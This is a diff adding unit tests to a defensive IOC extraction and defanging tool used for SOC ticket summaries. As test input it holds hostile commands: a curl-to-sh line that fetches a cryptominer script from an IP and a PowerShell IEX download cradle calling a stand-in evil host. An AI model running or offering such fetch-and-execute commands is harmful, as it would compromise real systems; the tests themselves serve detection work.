@@ -81,3 +81,40 @@ test('empty and non-string input', () => {
   assert.deepEqual(IOC.extract(null), []);
   assert.equal(IOC.defangText(''), '');
 });
+
+test('extracts modern high-abuse phishing TLDs (.cfd, .sbs, .cyou, .vip, .bond, .lat, .lol)', () => {
+  const items = IOC.extract('http://login.evil.cfd/a bare: bad.sbs c2.cyou phish.vip lure.bond drop.lat C2.lol');
+  const domains = items.filter((i) => i.type === 'Domain').map((i) => i.value);
+  assert.deepEqual(domains, ['login.evil.cfd', 'bad.sbs', 'c2.cyou', 'phish.vip', 'lure.bond', 'drop.lat', 'c2.lol']);
+});
+
+test('extracts and defangs IPv6 addresses without false positives on timestamps or PowerShell :: calls', () => {
+  const items = IOC.extract('[Convert]::FromBase64String at 12:34:56 from 2001:db8:85a3::8a2e:370:7334 and fe80::1ff:fe23:4567:890a');
+  const ipv6s = items.filter((i) => i.type === 'IPv6');
+  assert.equal(ipv6s.length, 2);
+  assert.equal(ipv6s[0].value, '2001:db8:85a3::8a2e:370:7334');
+  assert.equal(ipv6s[0].defanged, '2001[:]db8[:]85a3[:][:]8a2e[:]370[:]7334');
+  assert.equal(ipv6s[0].note, 'documentation');
+  assert.equal(ipv6s[1].note, 'link-local');
+});
+
+test('preserves SafeLinks pipe characters inside query strings while splitting shell pipes', () => {
+  const safe = IOC.extract('https://nam12.safelinks.protection.outlook.com/?url=https://evil.com/x&data=05|02|');
+  assert.ok(safe[0].value.endsWith('data=05|02|'), safe[0].value);
+  const sh = IOC.extract('curl http://185.220.101.55/xmrig.sh|sh');
+  assert.equal(sh[0].value, 'http://185.220.101.55/xmrig.sh');
+});
+
+test('toTicketMarkdown formats defanged SOC ticket summary with decode chain and IOC table', () => {
+  const md = IOC.toTicketMarkdown({
+    steps: ['Base64 (64 bytes)', 'UTF-8'],
+    warnings: ['Phishing "@" trick detected'],
+    notes: ['Missing padding added'],
+    output: 'IEX (New-Object Net.WebClient).DownloadString("https://evil.cfd/a.ps1")'
+  });
+  assert.ok(md.includes('### SOC Triage Summary (Decodora)'));
+  assert.ok(md.includes('`Base64 (64 bytes) \u2192 UTF-8`'));
+  assert.ok(md.includes('hxxps[:]//evil[.]cfd/a.ps1'));
+  assert.ok(!md.includes('https://evil.cfd'));
+  assert.ok(md.includes('| Domain | `evil[.]cfd` |'));
+});
